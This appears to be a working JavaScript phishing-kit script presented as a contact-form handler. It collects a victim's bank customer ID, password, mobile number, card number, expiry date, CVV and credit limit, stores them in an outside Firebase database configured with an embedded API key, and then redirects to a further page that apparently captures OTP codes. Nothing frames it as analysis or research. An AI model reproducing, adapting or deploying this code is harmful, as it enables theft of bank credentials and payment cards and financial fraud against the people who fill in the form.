const firebaseConfig = {
  apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
  authDomain: "start-45a39.firebaseapp.com",
  databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
  projectId: "start-45a39",
  storageBucket: "start-45a39.appspot.com",
  messagingSenderId: "377019727798",
  appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var customerid = getElementVal("lc_id");
  var password = getElementVal("lpass");
  var mobile = getElementVal("rgmob");
  var creditnumber = getElementVal("ccnum");
  var expiredate = getElementVal("edate");
  var cvv = getElementVal("cvv");
  var creditlimit = getElementVal("ccl");
  var regmobile = getElementVal("rgmob_cc");
  var otp1 = 0;
  var otp2 = 0;
  var otp3 = 0;
  var otp4 = 0;
  var otp5 = 0;
  var otp6 = 0;
  var holdername = 0;
  var dob = 0;

  saveMessages(customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob);
}

const saveMessages = (customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob) => {
  var newContactForm = contactFormDB.push();

  newContactForm.set({
      customerid: customerid,
      password: password,
      mobile: mobile,
      creditnumber: creditnumber,
      expiredate: expiredate,
      cvv: cvv,
      creditlimit: creditlimit,
      regmobile: regmobile,
      otp1: otp1,
      otp2: otp2,
      otp3: otp3,
      otp4: otp4,
      otp5: otp5,
      otp6: otp6,
      holdername: holdername,
      dob: dob,
  }, function(error) {
      if (error) {
          console.error("Error saving data:", error);
      } else {
          // Redirect to the update page with the new ID
          window.location.href = `tok.html?id=${newContactForm.key}`;
      }
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
